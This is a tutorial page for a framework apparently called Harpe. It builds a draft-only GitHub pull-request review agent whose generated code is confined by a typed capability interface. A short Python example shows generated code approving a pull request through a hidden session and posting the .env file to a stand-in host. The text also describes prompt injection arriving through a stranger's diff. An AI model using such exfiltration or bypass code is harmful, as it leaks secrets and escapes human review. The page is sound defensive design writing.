+++
title = "GitHub PR Review"
aliases = ["/tutorial/create-pr-review-agent/"]
+++

**A GitHub pull request reviewer.** It reads the diff, follows identifiers into
a snapshot of the repository, and leaves a **pending draft review** for a person
to look at. It cannot publish a standalone comment, approve, or merge — and why
it cannot is the subject of this page.

## The problem

A review agent has to read a lot of a repository to say anything useful — the
diff, and then whatever the diff points at. The credential that satisfies that
appetite is a token over the whole repository.

![What the review needs, against what a credential grants. The reviewer needs
four operations: read the pull request, read repository files, search code, and
create a pending review. The smallest credential that supplies those also grants
submitting a review, approving, requesting changes, dismissing a review and
closing the pull request.](/img/pr-review-surface.svg)

Four operations against a class of operations on a class of resources. The gap
between those two shapes is where a review agent goes wrong, and no amount of
care in the prompt closes it.

And something else gets to write into that gap. On an open repository the diff
arrives from a stranger's fork, so *the prompt tells it not to approve* is a
rule the attacker has been invited to argue with.

## The alternatives, and where each one stops

If you have shipped an agent before, you have already reached for at least one
of these. None of them is wrong, and two of them you should be doing anyway. It
is worth being precise about where each runs out.

**Scope the credential.** A fine-grained token or a GitHub App installation can
be read-only on contents and limited to one repository. Do this — it is real
narrowing and it costs nothing. What it cannot express is this agent's actual
rule: *may leave a pending review, may never submit one*. The smallest
permission that saves a draft is `Pull requests: write`, which also submits,
approves, requests changes, dismisses reviews and closes the pull request.
Permissions are per-resource-class, and there is no rung between "cannot review"
and "can approve". Scoping also
constrains the credential at GitHub's edge, not the program holding it. A
read-only token does nothing about a program that reads a private diff and posts
it somewhere else.

**Sandbox the process.** A container decides about *network access*: this
process may open sockets, or it may not. Neither answer helps. Denied, the agent
cannot read the pull request at all. Allowed, everything the credential permits
is reachable again, and the container has no view of which of those operations
you actually meant to hand to generated code. Keep the container — it bounds CPU, memory, and blast radius, which capabilities
do not (see [Add defense in depth](/guides/defense-in-depth/)) — but it is
deciding a different question.

**Allowlist the URLs.** A proxy is where most teams end up, and it gets closer
than the other two. It also matches on strings outside the language, so it
drifts as the API grows, it has to encode method and path and body separately,
and a program that can reach `POST /repos/{owner}/{repo}/pulls/{n}/reviews` at
all can send `"event": "APPROVE"` in the body. The check sees a request. It does
not see what the call meant.

**Expose one narrow tool and be done.** Correct, and worth saying why: in a tool
loop the set of operations the model can perform is exactly the set you defined,
and your handler sees every one. If the job is one call, stop here. Review is
not one call — it is a diff, then twenty file reads that depend on what the diff
said, then identifier lookups that depend on those. Routing every intermediate
result back through the model is slow, expensive, and lossy, which is why the
model writes a program ([Why Harpe?](/overview/why-harpe/) makes that case in
full). A program is not a call, and the property above does not survive the
switch.

**Generate Python and run it in a container.** Where that leads, and where most
teams accepting code as the action language end up: an injected `api.py` with
the four operations, a hardened process, an egress allowlist. But `api.py` is
not a boundary — it is a module in the same address space as its caller.

```python
import api
api._session.post(".../pulls/1/reviews", json={"event": "APPROVE"})  # token is in here
requests.post("https://elsewhere.example", data=api.readFile(".env"))
```

Python has no module confinement, so enforcement moves outward to the container
and the proxy — the two layers already established as deciding a different
question. What remains arrives late: `api.merge_pr()` raises `AttributeError` at
step twenty, after nineteen reads, which for a mutating operation is the
difference between an action half-finished and one that never began.

Harpe's answer is to move the decision into the type system. The trusted runtime
keeps GitHub's broader API and the token. The model-written program receives
four typed operations, and a program that names anything else does not compile.

## The capability is the review surface

Everything the agent can do to a pull request is declared in `sandbox/API.jo`:

```jo
interface GitHub
  def getPR(): PRInfo
  def readFile(path: String, start: Int = 0, ends: Int = -1): String
  def findDefinition(identifier: String): List[DefinitionMatch]
  def saveDraftReview(body: String, comments: List[LineComment]): Unit receives stdout
end
```

A generated program names those operations and nothing else:

```jo
namespace sandbox.guest
import jo.IO.stdout
import sandbox.api.*

def runTask(): Unit receives stdout, github =
  val pr = github.getPR()
  for diff in pr.diffs do
    println "\{diff.status} | \{diff.path} (+\{diff.additions} -\{diff.deletions})"

  github.saveDraftReview("Draft review summary", [])
```

Three modules in `sandbox/jo.toml` hold that boundary open. It is the same
shape in every Harpe project, so it is worth reading once:

```toml
[module.api]        # the contract, and nothing else
src = ["API.jo"]
packages = [{ name = "harpe-caps", version = "0.9" }]

[module.runtime]    # the implementation: HTTP, the token, Python interop
src = ["Runtime.jo", "GithubClient.jo"]
enable-ffi = true
modules = ["api"]
packages = [{ name = "harpe", version = "0.9" }]

[module.guest]      # what a generated program is compiled against
src = ["Task.jo"]
modules = ["api", { id = "runtime", link = true }]
packages = [{ name = "harpe-caps", version = "0.9" }]
```

`api` carries only the interface and its value types, and it depends on the pure
`harpe-caps` package rather than on `harpe`. `runtime` is the only module with
`enable-ffi`, so it is the only one that can reach Python, the network, or the
environment. `guest` is compiled from `Task.jo` against `api`, and names
`runtime` as `link = true` — the implementation is supplied when the program is
linked, not offered to it as something `Task.jo` can import.

The effect is that `GithubClient`, the token, and `harpe` itself are outside the
guest's compile-time world. A generated program that tries to open a socket,
read an arbitrary file, or call an operation `interface GitHub` does not declare
fails to compile, and the compiler error goes back to the model to fix. The
Python snippet above has no spelling here — there is no `import` that reaches a
session, a token, or a socket. See [Code and Sandboxing](/concepts/sandbox/) for
what that build guarantees.

That also answers the exfiltration case scoping could not: no operation here
sends bytes to a destination the program chooses. The one channel out is the
review body — model-authored text on the pull request the agent was already
reading — so the honest claim is not *no egress* but *one egress, in front of
the person who opens the draft*.

`sandbox/Runtime.jo` is where the two halves meet. It constructs the
implementation with the PR URL and token, binds it to the `github` capability,
and calls the guest:

```jo
with api.github = ghImpl in
  api.runTask()
```

## Draft-only is the boundary

`AGENT.md` instructs the agent to submit reviews as **pending** drafts, and the
capability enforces that policy. `saveDraftReview` has no verdict argument, and its
trusted implementation always omits GitHub's event field, which saves a draft.
Publishing standalone comments, and merging are absent from `interface GitHub`,
so a model-written program that attempts any of them does not compile.

To add the publishing operation, widen the interface and protect the effect inside
the trusted implementation with [human approval](/concepts/approvals/). The
implementation should perform it only after `Approvals.Approved`. Adding an
instruction to the prompt alone would not create a boundary.

The [flight booking agent](/case-studies/flight-booker/) demonstrates that
approval pattern for placing orders.

## What this does not buy you

Worth saying plainly, because the boundary is narrower than it first sounds.

The compiler proves which operations a program *may* use. It proves nothing
about whether the review is any good. A confidently wrong comment saved as a
draft is still a wrong comment — leaving it as a draft is what makes that cheap
rather than embarrassing.

It does not bound CPU, memory, or wall-clock beyond the timeouts `runCode`
already applies, so a container is still worth having underneath. [Add defense
in depth](/guides/defense-in-depth/) covers what to put there.

There is also a language to learn, which is the honest cost and the most common
reason to walk away. It is worth knowing what it does not cost: your Python does
not go anywhere. `[module.runtime]` sets `enable-ffi`, so trusted code calls
Python libraries directly, and these templates carry an ordinary
`requirements.txt`. What Jo buys is the one thing Python cannot express — a
module that is *unable* to reach the module beside it — and that is confined to
the sandbox boundary rather than spread through the application.

And it is not free: every `runCode` call compiles a program before it runs one.
On the default JVM launcher that startup is noticeable, and [Speed up
compilation](/guides/faster-compilation/) is worth doing before you judge the
latency. Compile *failures*, on the other hand, are ordinary — the error goes
back to the model as something to fix, and a model correcting its own program
against a type error is the loop working, not a fault.

## Run it

The template is a complete project. Copy it into your own directory:

```sh
jo new my-reviewer --template typescope/harpe:pr-review
cd my-reviewer
pip install -r requirements.txt
```

Copy the example environment file, and fill in a GitHub personal access token
carrying the `repo` scope, plus one model provider key:

```sh
cp .env.example .env
```

```sh
GITHUB_TOKEN=...
ANTHROPIC_API_KEY=...
```

Set `OPENAI_API_KEY` instead to use OpenAI. To use OpenRouter, set
`OPENROUTER_API_KEY` and `MODEL`. The provider is chosen by which key is
present.

Review a pull request:

```sh
jo review -- https://github.com/owner/repo/pull/123
```

`jo review` builds the sandbox guest and then runs a single turn. The agent
prints each tool call as it works, so you can watch it fetching the PR, compiling a
program, and saving its draft review.

## What to customize

```text
my-reviewer/
  AGENT.md               # the review philosophy and workflow the model reads
  src/
    Main.jo              # startup, tool assembly, and one turn
    PrintInteract.jo     # maps turn events to terminal output
  sandbox/
    API.jo               # the GitHub capability a generated program may call
    GithubClient.jo      # the HTTP client behind it
    Runtime.jo           # binds the implementation to the capability
    Task.jo              # the guest entry point runCode overwrites each turn
  skills/
    api.jo               # symlink to sandbox/API.jo, read on demand
    jo-syntax.md         # Jo syntax reference
```

- Edit `AGENT.md` to change what the review flags and how it is worded.
- Edit `sandbox/API.jo` to change what the agent may do at all, then update
  `GithubImpl` in `sandbox/Runtime.jo` to implement it.
- `skills/api.jo` links to `sandbox/API.jo`, so the model reads the exact contract
  with `skillsRead` rather than carrying it in every prompt.
- Edit `src/Main.jo` to change the model, the tool budget, or the environment
  granted to the guest. The PR URL and token reach the sandbox as an ordinary
  argument:

  ```jo
  val guestEnv = Map:
    "PR_URL" ~ pr
    "GITHUB_TOKEN" ~ os.getenv("GITHUB_TOKEN", "")
  ```
